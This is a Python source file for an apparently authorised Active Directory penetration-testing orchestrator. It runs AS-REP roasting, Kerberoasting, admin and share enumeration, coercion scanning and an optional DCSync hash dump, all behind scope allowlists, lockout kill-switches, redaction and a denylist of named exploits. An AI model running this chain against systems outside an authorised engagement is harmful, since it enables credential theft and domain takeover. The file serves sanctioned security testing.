"""PARSDX post-UBDEN offensive orchestrator (safety-hardened).

Runs AFTER UBDEN's read-only assessment. Reads the UBDEN run folder, then drives a bounded,
READ-ONLY-FIRST offensive chain against IN-SCOPE AD only, saving evidence into the run folder.

Safety model (see SAFETY.md / parsdx-safety-audit.md):
  * Mandatory scope allowlist — no allowlist => zero packets (fail closed).
  * Credential required (password XOR hashes) — never authenticates with an empty password.
  * One guarded pre-flight bind validates the credential BEFORE any multi-host fan-out; a bad
    credential aborts before it can lock the account.
  * Every authenticated step is per-host, single-thread, stdin-closed, short-timeout; output is
    scanned for lockout/logon-failure and the whole run HARD-STOPS on the first hit.
  * A `STOP` file in the run dir is an external kill-switch checked before every step.
  * Evidence dir 0700, files 0600. Writes/dumps are gated behind one confirmation choke point
    (enable_writes + YETKILIYIM/--assume-yes) reachable from BOTH entrypoints; DCSync needs a
    further --allow-dcsync.
  * DC-breaking / broad-impact tooling (Zerologon, noPac, EternalBlue, mimikatz, Responder-active,
    mitm6) is denylisted and absent by design.
"""
from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import ipaddress
import os
import re
import shutil
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from guard import (AuthGuard, LockoutPolicy, LockoutRisk, is_lockout_signal,  # noqa: E402
                   read_lockout_policy_ldap)

TOOLS = {
    "nxc": ["nxc", "netexec"],
    "certipy": ["certipy", "certipy-ad"],
    "bloodhound-python": ["bloodhound-ce-python", "bloodhound-python"],  # CE first: legacy emits v4 JSON CE can't ingest
    "GetUserSPNs": ["impacket-GetUserSPNs", "GetUserSPNs.py"],
    "GetNPUsers": ["impacket-GetNPUsers", "GetNPUsers.py"],
    "coercer": ["coercer", "Coercer"],
    "secretsdump": ["impacket-secretsdump", "secretsdump.py"],
}

# Never invoked. Present here so any future step is checked against it, not so it can be enabled.
DENYLIST = ("zerologon", "nopac", "no_pac", "eternalblue", "ms17-010", "ms17_010",
            "mimikatz", "mitm6", "printnightmare", "petitpotam")  # petitpotam=fire; we only scan

_SECRET_FLAGS = {"-p", "--password", "-H", "--hashes", "-hashes", "--hash"}
_LOGON_FAIL = ("STATUS_LOGON_FAILURE", "LOGON_FAILURE", "KDC_ERR_PREAUTH_FAILED",
               "AUTHENTICATE_MESSAGE", "STATUS_WRONG_PASSWORD")


class SafetyAbort(Exception):
    """Raised to stop the run for a safety reason (fail closed)."""


def _now_iso() -> str:
    return dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def tool_path(key: str) -> str | None:
    for name in TOOLS.get(key, [key]):
        p = shutil.which(name)
        if p:
            return p  # absolute path (avoid PATH-hijack / TOCTOU)
    return None


def redact(argv: list[str]) -> list[str]:
    out, redact_next = [], False
    for tok in argv:
        if redact_next:
            out.append("***"); redact_next = False; continue
        if tok in _SECRET_FLAGS:
            out.append(tok); redact_next = True
        elif tok.startswith(("-p=", "--password=", "-H=", "--hashes=", "--hash=")):
            out.append(tok.split("=", 1)[0] + "=***")
        elif not tok.startswith("-") and "/" in tok and ":" in tok:
            head, _, pw = tok.partition(":")
            out.append(head + ":***" if ("/" in head and pw) else tok)
        else:
            out.append(tok)
    return out


# ---- scope allowlist ---------------------------------------------------------

_HOSTNAME_RE = re.compile(r"^(?=.{1,253}$)([a-zA-Z0-9_-]{1,63})(\.[a-zA-Z0-9_-]{1,63})*$")


def load_scope(path: str):
    """Parse an allowlist file (one IP / CIDR / hostname per line, # comments) into (networks, hostnames)."""
    nets, hosts = [], set()
    with open(path, encoding="utf-8") as fh:
        for line in fh:
            s = line.split("#", 1)[0].strip()
            if not s or s.startswith("-"):
                continue
            try:
                nets.append(ipaddress.ip_network(s, strict=False))
                continue
            except ValueError:
                pass
            try:
                ip = ipaddress.ip_address(s)
                nets.append(ipaddress.ip_network(f"{s}/{'128' if ip.version == 6 else '32'}", strict=False))
                continue
            except ValueError:
                pass
            if _HOSTNAME_RE.match(s):
                hosts.add(s.lower())
    return nets, hosts


def in_scope(host: str, nets, hosts) -> bool:
    if not host or host.startswith("-"):
        return False
    try:
        ip = ipaddress.ip_address(host)
        return any(ip in n for n in nets)
    except ValueError:
        return host.lower() in hosts


def valid_target(host: str) -> bool:
    if not host or host.startswith("-"):
        return False
    try:
        ipaddress.ip_address(host); return True
    except ValueError:
        return bool(_HOSTNAME_RE.match(host))


# ---- context -----------------------------------------------------------------

class Context:
    def __init__(self):
        self.domain = self.dc = self.dc_ip = self.run_dir = None
        self.hosts = []


def _load_json(path):
    try:
        import json
        with open(path, encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return None


def load_context(run_dir: str) -> Context:
    ctx = Context(); ctx.run_dir = run_dir
    eng = _load_json(os.path.join(run_dir, "engagement.json")) or {}
    ad = eng.get("ad") if isinstance(eng.get("ad"), dict) else {}
    ctx.domain = (ad or {}).get("domain")
    ctx.dc = (ad or {}).get("dc") or (ad or {}).get("dc_host")
    ctx.dc_ip = (ad or {}).get("dc_ip") or (ad or {}).get("pinned_ip")
    adr = _load_json(os.path.join(run_dir, "AD_ASSESSMENT.json")) or {}
    ctx.domain = ctx.domain or adr.get("domain")
    ctx.dc = ctx.dc or adr.get("dc")
    inv = _load_json(os.path.join(run_dir, "DEVICE_INVENTORY.json")) or {}
    hosts = [d.get("ip") for d in (inv.get("devices") or []) if isinstance(d, dict) and d.get("ip")]
    if not hosts:
        hosts = [t for t in (eng.get("frozen_dns") or eng.get("targets") or []) if isinstance(t, str)]
    ctx.hosts = sorted({h for h in hosts if valid_target(h)})  # reject junk/option-like entries
    return ctx


# ---- plan --------------------------------------------------------------------

class Step:
    def __init__(self, name, key, argv, *, writes=False, auth=False, target="", note=""):
        self.name, self.key, self.argv = name, key, argv
        self.writes, self.auth, self.target, self.note = writes, auth, target, note


def _assert_not_denylisted(argv):
    joined = " ".join(argv).lower()
    for bad in DENYLIST:
        if bad in joined:
            raise SafetyAbort(f"denylisted operation in command: {bad}")


def build_plan(ctx, hosts, user, password, hashes, enable_writes, allow_dcsync) -> list[Step]:
    if not (password or hashes):
        raise SafetyAbort("no credential — refusing to build a plan (never authenticate empty)")
    dom = ctx.domain or "DOMAIN"
    dc_target = ctx.dc_ip or ctx.dc
    if not dc_target:
        raise SafetyAbort("no DC target (domain/dc/ip)")
    cred_pair = f"{dom}/{user}:{password}" if password else f"{dom}/{user}"
    imp_auth = ["-hashes", hashes] if hashes else []  # impacket PtH flag (empty on password path)

    def auth_flags():
        return ["-u", user, "-H", hashes] if hashes else ["-u", user, "-p", password]

    plan = [
        Step("adcs_find", "certipy",
             ["certipy", "find", "-u", f"{user}@{dom}", *(["-hashes", hashes] if hashes else ["-p", password]),
              "-dc-ip", dc_target, "-vulnerable", "-stdout"],
             auth=True, target=dc_target, note="ADCS ESC inventory (read-only; verb 'find' only)"),
        Step("bloodhound_dconly", "bloodhound-python",
             ["bloodhound-python", "-d", dom, "-u", user, *(["--hashes", hashes] if hashes else ["-p", password]),
              "-c", "DCOnly", "-ns", dc_target, "--zip"],
             auth=True, target=dc_target, note="attack-path graph, quiet DCOnly collection"),
        Step("asrep_roast", "GetNPUsers",
             ["GetNPUsers", cred_pair, *imp_auth, "-request", "-format", "hashcat", "-dc-ip", dc_target],
             auth=True, target=dc_target, note="AS-REP roastable accounts (valid cred)"),
        Step("kerberoast", "GetUserSPNs",
             ["GetUserSPNs", cred_pair, *imp_auth, "-request", "-dc-ip", dc_target],
             auth=True, target=dc_target, note="kerberoastable SPNs (valid cred)"),
    ]
    # Per-host auth steps (single-thread, scope-checked, guarded by run_plan's lockout scan).
    for h in hosts:
        plan.append(Step(f"auth_matrix_{h}", "nxc", ["nxc", "smb", h, *auth_flags(), "-t", "1"],
                         auth=True, target=h, note="local-admin check (single host, 1 thread)"))
    for h in hosts:
        plan.append(Step(f"share_triage_{h}", "nxc",
                         ["nxc", "smb", h, *auth_flags(), "-t", "1", "-M", "spider_plus"],
                         auth=True, target=h, note="readable-share crawl (read-only)"))
    plan.append(Step("coerce_scan", "coercer",
                     ["coercer", "scan", "-u", user, *(["--hashes", hashes] if hashes else ["-p", password]),
                      "-d", dom, "-t", dc_target],
                     auth=True, target=dc_target, note="coercion exposure probe (verb 'scan' only; does not fire)"))

    if enable_writes and allow_dcsync:
        plan.append(Step("dcsync_dump", "secretsdump",
                         ["secretsdump", cred_pair, *imp_auth, "-just-dc-ntlm", "-dc-ip", dc_target],
                         writes=True, auth=True, target=dc_target,
                         note="DCSync PROOF ONLY — do not exfiltrate (needs --enable-writes AND --allow-dcsync)"))
    for s in plan:
        _assert_not_denylisted(s.argv)
    return plan


# ---- confirmation choke point (both entrypoints hit this) --------------------

def confirm_writes(enable_writes, dry_run, assume_yes) -> None:
    if not enable_writes or dry_run:
        return
    if assume_yes:
        return
    if not sys.stdin or not sys.stdin.isatty():
        raise SafetyAbort("write phase needs interactive YETKILIYIM confirmation or --assume-yes")
    ans = input("!! WRITE/DUMP phase enabled — this changes/dumps state. Type YETKILIYIM to proceed: ")
    if ans.strip() != "YETKILIYIM":
        raise SafetyAbort("write confirmation declined")


# ---- credential pre-flight ---------------------------------------------------

def _nxc_preflight(ctx, user, password, hashes):
    bin_ = tool_path("nxc")
    if not bin_:
        return None, False  # cannot validate -> fail closed
    target = ctx.dc_ip or ctx.dc
    creds = ["-u", user] + (["-H", hashes] if hashes else ["-p", password])
    try:
        r = subprocess.run([bin_, "smb", target, *creds, "-t", "1"], capture_output=True,
                           text=True, timeout=60, stdin=subprocess.DEVNULL)
    except Exception:  # noqa: BLE001
        return None, False
    out = (r.stdout or "") + (r.stderr or "")
    if is_lockout_signal(out):
        return None, False
    return None, ("[+]" in out)


def preflight_and_policy(ctx, user, password, hashes):
    """Validate the credential ONCE against the DC before any fan-out. Returns (policy|None, ok)."""
    if password:
        try:
            return read_lockout_policy_ldap(ctx.dc, ctx.domain, user, password, ctx.dc_ip), True
        except LockoutRisk:
            return _nxc_preflight(ctx, user, password, hashes)  # ldap3 missing -> nxc fallback
        except Exception as e:  # noqa: BLE001
            # Distinguish a rejected credential (invalid) from a TLS/socket problem (self-signed AD
            # cert is normal). Only a genuine bind/credential failure means "abort as invalid";
            # anything else (TLS, cert, connect) falls back to the nxc bind instead of aborting.
            blob = (type(e).__name__ + " " + str(e)).lower()
            if "invalidcredential" in blob or "bind" in blob or "logonfailure" in blob:
                return None, False
            return _nxc_preflight(ctx, user, password, hashes)
    return _nxc_preflight(ctx, user, password, hashes)


# ---- execution ---------------------------------------------------------------

def _sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def _tail(path, n=65536):
    try:
        with open(path, "rb") as fh:
            fh.seek(0, os.SEEK_END)
            fh.seek(max(0, fh.tell() - n))
            return fh.read().decode("utf-8", "replace")
    except OSError:
        return ""


def _scrub_secrets(path, secrets):
    """Replace known secret values (password/hashes) in a captured evidence file with '***'.
    Tools like nxc echo the cleartext 'DOMAIN\\user:password' into their output; strip it so the
    on-disk evidence never holds the credential. (DCSync hash loot is the finding itself and cannot
    be scrubbed — it relies on 0600 + gating + no-exfil.) Runs before the SHA-256 so the hash matches."""
    reals = [s for s in (secrets or []) if s and len(s) >= 3]
    if not reals:
        return
    try:
        data = open(path, encoding="utf-8", errors="replace").read()
    except OSError:
        return
    new = data
    for s in reals:
        new = new.replace(s, "***")
    if new != data:
        try:
            open(path, "w", encoding="utf-8").write(new)
        except OSError:
            pass


def run_plan(plan, out_dir, dry_run, ctx, nets, hosts, secrets=None) -> list[dict]:
    import json
    os.umask(0o077)
    os.makedirs(out_dir, exist_ok=True)
    try:
        os.chmod(out_dir, 0o700)
    except OSError:
        pass
    stop_file = os.path.join(ctx.run_dir, "STOP")
    events, aborted = [], False
    for i, step in enumerate(plan, 1):
        red = redact(step.argv)
        rec = {"step": step.name, "tool": step.key, "command": red, "writes": step.writes,
               "auth": step.auth, "action": "write" if step.writes else "read",
               "note": step.note, "started_at": _now_iso()}
        # external kill-switch
        if os.path.exists(stop_file):
            rec["status"] = "aborted_stop_file"; events.append(rec); aborted = True
            print(f"[{i:02d}] {step.name}: STOP file present — aborting run"); break
        # scope defense-in-depth
        if step.target and not in_scope(step.target, nets, hosts) and not dry_run:
            rec["status"] = "out_of_scope_skip"; events.append(rec)
            print(f"[{i:02d}] {step.name}: target {step.target} OUT OF SCOPE — skipped"); continue
        try:
            _assert_not_denylisted(step.argv)
        except SafetyAbort as e:
            rec["status"] = "blocked_denylist"; rec["reason"] = str(e); events.append(rec); continue
        if dry_run:
            rec["status"] = "dry_run"
            print(f"[{i:02d}] {step.name:22s} {'WRITE ' if step.writes else ''}-> {' '.join(red)}")
            events.append(rec); continue
        bin_ = tool_path(step.key)
        if not bin_:
            rec["status"] = "missing_tool"; rec["reason"] = str(TOOLS.get(step.key))
            print(f"[{i:02d}] {step.name}: MISSING TOOL"); events.append(rec); continue
        out_file = os.path.join(out_dir, f"{step.name}.txt")
        argv = [bin_] + step.argv[1:]
        timeout = 120 if step.auth else 600
        import time
        t0 = time.time()
        try:
            with open(out_file, "wb") as fh:
                proc = subprocess.run(argv, stdout=fh, stderr=subprocess.STDOUT,
                                      stdin=subprocess.DEVNULL, timeout=timeout, cwd=out_dir)
            rec["exit_code"] = proc.returncode
            rec["status"] = "ok" if proc.returncode == 0 else "error"
        except subprocess.TimeoutExpired:
            rec["status"] = "timeout"
        except Exception as exc:  # noqa: BLE001
            rec["status"] = "error"; rec["reason"] = type(exc).__name__
        rec["seconds"] = round(time.time() - t0, 1)
        rec["finished_at"] = _now_iso()
        if os.path.exists(out_file):
            _scrub_secrets(out_file, secrets)  # strip cleartext creds before hashing/storing
            try:
                os.chmod(out_file, 0o600)
            except OSError:
                pass
            rec["output"] = os.path.relpath(out_file, ctx.run_dir)
            rec["sha256"] = _sha256_file(out_file)
        events.append(rec)
        print(f"[{i:02d}] {step.name}: {rec['status']}")
        # ---- kill-switches on output ----
        if step.auth:
            tail = _tail(out_file).upper()
            if is_lockout_signal(tail):
                rec["status"] = "LOCKOUT_ABORT"
                print(f"[{i:02d}] {step.name}: !!! ACCOUNT LOCKOUT SIGNAL — HARD STOP !!!")
                aborted = True; break
            if any(sig in tail for sig in _LOGON_FAIL):
                rec["status"] = "AUTH_FAIL_ABORT"
                print(f"[{i:02d}] {step.name}: credential rejected — aborting before fan-out")
                aborted = True; break
    with open(os.path.join(out_dir, "parsdx_steps.json"), "w", encoding="utf-8") as fh:
        json.dump(events, fh, indent=2)
    try:
        os.chmod(os.path.join(out_dir, "parsdx_steps.json"), 0o600)
    except OSError:
        pass
    if aborted:
        print("run aborted by a safety kill-switch; partial evidence retained.")
    return events


def run_offensive(ctx, *, user, password=None, hashes=None, nets=None, hosts_allow=None,
                  enable_writes=False, allow_dcsync=False, dry_run=False, assume_yes=False,
                  out_dir=None, skip_preflight=False) -> dict:
    """THE single entrypoint (both attack.main and pipeline call this). Enforces every gate."""
    nets = nets or []; hosts_allow = hosts_allow or set()
    if not user:
        raise SafetyAbort("no --user")
    if dry_run and not (password or hashes):
        password = "<PAROLA>"  # placeholder for preview only
    if not dry_run and not (bool(password) ^ bool(hashes)):
        raise SafetyAbort("exactly one of --password / --hashes is required (never authenticate empty)")
    if not dry_run and not (nets or hosts_allow):
        raise SafetyAbort("no --scope allowlist — refusing to send any packet (fail closed)")

    in_hosts = [h for h in ctx.hosts if in_scope(h, nets, hosts_allow)]
    dropped = [h for h in ctx.hosts if h not in in_hosts]
    dc_target = ctx.dc_ip or ctx.dc
    if not dry_run and dc_target and not in_scope(dc_target, nets, hosts_allow):
        raise SafetyAbort(f"DC {dc_target} is not in the scope allowlist")

    confirm_writes(enable_writes, dry_run, assume_yes)

    if not dry_run and skip_preflight:
        print("!! WARNING: skip_preflight=True disables the load-bearing lockout pre-flight. "
              "A wrong/expired credential can now fan out and lock the account.", file=sys.stderr)
    if not dry_run and not skip_preflight:
        policy, ok = preflight_and_policy(ctx, user, password, hashes)
        if not ok:
            raise SafetyAbort("credential pre-flight bind FAILED (or unverifiable) — aborting before any fan-out")
        g = AuthGuard(policy or LockoutPolicy(0, None, None, "unknown"))
        print(f"# pre-flight OK. lockout policy: threshold={getattr(policy,'threshold','?')} "
              f"window={getattr(policy,'observation_window_min','?')} -> safe budget {g.budget()}")

    plan = build_plan(ctx, in_hosts, user, password, hashes, enable_writes, allow_dcsync)
    out_dir = out_dir or os.path.join(ctx.run_dir, "parsdx")
    print(f"# scope: {len(in_hosts)} in / {len(dropped)} dropped out-of-scope; DC={dc_target}")
    events = run_plan(plan, out_dir, dry_run, ctx, nets, hosts_allow, secrets=[password, hashes])
    return {"events": events, "in_scope_hosts": in_hosts, "dropped_hosts": dropped}


# ---- self-test ---------------------------------------------------------------

def _self_test() -> int:
    import json, tempfile
    ok = 0

    def check(name, cond):
        nonlocal ok
        print(f"  [{'PASS' if cond else 'FAIL'}] {name}")
        if cond:
            ok += 1

    # redaction
    check("password redacted after -p", "S3cret!" not in " ".join(redact(["nxc", "-p", "S3cret!"])))
    check("flag=value redacted", redact(["x", "--password=S3cret!"]) == ["x", "--password=***"])
    check("domain/user:pass redacted", "S3cret!" not in " ".join(redact(["GetUserSPNs", "corp/u:S3cret!"])))

    # scope
    with tempfile.TemporaryDirectory() as d:
        sp = os.path.join(d, "scope.txt")
        open(sp, "w").write("10.0.0.0/24\n10.9.9.9\ndc01.corp.local\n# comment\n-bad\n")
        nets, hosts = load_scope(sp)
        check("cidr in scope", in_scope("10.0.0.50", nets, hosts))
        check("single ip in scope", in_scope("10.9.9.9", nets, hosts))
        check("out-of-range ip rejected", not in_scope("10.1.0.1", nets, hosts))
        check("hostname in scope", in_scope("dc01.corp.local", nets, hosts))
        check("option-like host rejected", not in_scope("-M", nets, hosts))
        check("comment line not a host", "-bad" not in hosts and "# comment" not in hosts)

    # context rejects junk hosts
    with tempfile.TemporaryDirectory() as d:
        json.dump({"ad": {"domain": "corp.local", "dc": "dc01", "dc_ip": "10.0.0.10"}},
                  open(os.path.join(d, "engagement.json"), "w"))
        json.dump({"devices": [{"ip": "10.0.0.10"}, {"ip": "-M"}, {"ip": "10.0.0.20"}]},
                  open(os.path.join(d, "DEVICE_INVENTORY.json"), "w"))
        ctx = load_context(d)
        check("junk host '-M' dropped from context", ctx.hosts == ["10.0.0.10", "10.0.0.20"])

        # build_plan: empty cred refused
        refused = False
        try:
            build_plan(ctx, ctx.hosts, "u", None, None, False, False)
        except SafetyAbort:
            refused = True
        check("build_plan refuses empty credential", refused)

        # per-host expansion + no write by default
        plan = build_plan(ctx, ctx.hosts, "u", "P", None, False, False)
        names = [s.name for s in plan]
        check("per-host auth steps expanded", "auth_matrix_10.0.0.10" in names and "auth_matrix_10.0.0.20" in names)
        check("no write step by default", not any(s.writes for s in plan))
        check("nxc steps single-thread", all("-t" in s.argv and s.argv[s.argv.index("-t")+1] == "1"
                                              for s in plan if s.name.startswith("auth_matrix")))
        check("coercer verb is scan", any(s.key == "coercer" and s.argv[1] == "scan" for s in plan))
        check("certipy verb is find", any(s.key == "certipy" and s.argv[1] == "find" for s in plan))

        # dcsync only with enable_writes AND allow_dcsync
        check("no dcsync without allow flag", "dcsync_dump" not in [s.name for s in build_plan(ctx, ctx.hosts, "u", "P", None, True, False)])
        check("dcsync present with both flags", "dcsync_dump" in [s.name for s in build_plan(ctx, ctx.hosts, "u", "P", None, True, True)])

        # hash (pass-the-hash) path: impacket steps carry -hashes, it is redacted, coercer uses --hashes
        hp = build_plan(ctx, ctx.hosts, "u", None, "aad3b435:31d6cfe0d16ae", True, True)
        kb = next(s for s in hp if s.name == "kerberoast")
        check("impacket step carries -hashes on PtH path", "-hashes" in kb.argv)
        check("NT hash redacted in logged plan", "31d6cfe0d16ae" not in " ".join(redact(kb.argv)))
        co = next(s for s in hp if s.key == "coercer")
        check("coercer uses --hashes (not -H)", "--hashes" in co.argv and "-H" not in co.argv)
        ds = next(s for s in hp if s.name == "dcsync_dump")
        check("dcsync carries -hashes on PtH path", "-hashes" in ds.argv)

        # run_offensive gates: no scope => fail closed
        blocked = False
        try:
            run_offensive(ctx, user="u", password="P", nets=[], hosts_allow=set())
        except SafetyAbort:
            blocked = True
        check("run_offensive fails closed without scope", blocked)

        # empty credential live => refused
        blocked2 = False
        try:
            run_offensive(ctx, user="u", nets=[ipaddress.ip_network("10.0.0.0/24")])
        except SafetyAbort:
            blocked2 = True
        check("run_offensive refuses empty credential live", blocked2)

        # write without confirmation in non-tty => refused
        blocked3 = False
        try:
            confirm_writes(True, False, False)
        except SafetyAbort:
            blocked3 = True
        check("confirm_writes blocks unattended writes", blocked3)
        check("confirm_writes allows with assume_yes", confirm_writes(True, False, True) is None)

        # dry-run: builds plan, filters scope, no live calls, all redacted
        res = run_offensive(ctx, user="u", password="S3cretPw!",
                            nets=[ipaddress.ip_network("10.0.0.0/24")], dry_run=True)
        check("dry-run keeps only in-scope hosts", set(res["in_scope_hosts"]) == {"10.0.0.10", "10.0.0.20"})
        cmds = " ".join(" ".join(e["command"]) for e in res["events"])
        check("dry-run leaks no password (real check)", "S3cretPw!" not in cmds and "***" in cmds)

        # secret-scrub removes a cleartext credential echoed into an evidence file
        ev = os.path.join(d, "ev.txt")
        open(ev, "w").write("SMB 10.0.0.20 [+] corp.local\\svc:S3cretPw! (Pwn3d!)")
        _scrub_secrets(ev, ["S3cretPw!", None])
        check("secret-scrub strips cleartext cred from evidence", "S3cretPw!" not in open(ev).read())

        # STOP kill-switch aborts
        open(os.path.join(d, "STOP"), "w").write("halt")
        res2 = run_offensive(ctx, user="u", password="P",
                             nets=[ipaddress.ip_network("10.0.0.0/24")], skip_preflight=True)
        check("STOP file aborts the run", any(e["status"] == "aborted_stop_file" for e in res2["events"]))

    total = 30
    print(f"\n{ok}/{total} checks passed")
    return 0 if ok == total else 1


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="PARSDX post-UBDEN offensive orchestrator (hardened)")
    ap.add_argument("--self-test", action="store_true")
    ap.add_argument("--run-dir")
    ap.add_argument("--scope", help="REQUIRED for live runs: allowlist file (IP/CIDR/hostname per line)")
    ap.add_argument("--dc"); ap.add_argument("--domain")
    ap.add_argument("--user"); ap.add_argument("--password"); ap.add_argument("--hashes")
    ap.add_argument("--ip", dest="dc_ip")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--enable-writes", action="store_true")
    ap.add_argument("--allow-dcsync", action="store_true")
    ap.add_argument("--assume-yes", action="store_true")
    a = ap.parse_args(argv)
    if a.self_test:
        return _self_test()
    if not a.run_dir:
        ap.error("--run-dir required")
    ctx = load_context(a.run_dir)
    ctx.domain = a.domain or ctx.domain
    ctx.dc = a.dc or ctx.dc
    ctx.dc_ip = a.dc_ip or ctx.dc_ip
    nets, hosts = ([], set())
    if a.scope:
        nets, hosts = load_scope(a.scope)
    try:
        res = run_offensive(ctx, user=a.user, password=a.password, hashes=a.hashes,
                            nets=nets, hosts_allow=hosts, enable_writes=a.enable_writes,
                            allow_dcsync=a.allow_dcsync, dry_run=a.dry_run, assume_yes=a.assume_yes)
    except SafetyAbort as e:
        print(f"[SAFETY ABORT] {e}", file=sys.stderr); return 2
    print(f"# done: {len(res['in_scope_hosts'])} hosts in scope, {len(res['dropped_hosts'])} dropped")
    return 0


if __name__ == "__main__":
    sys.exit(main())
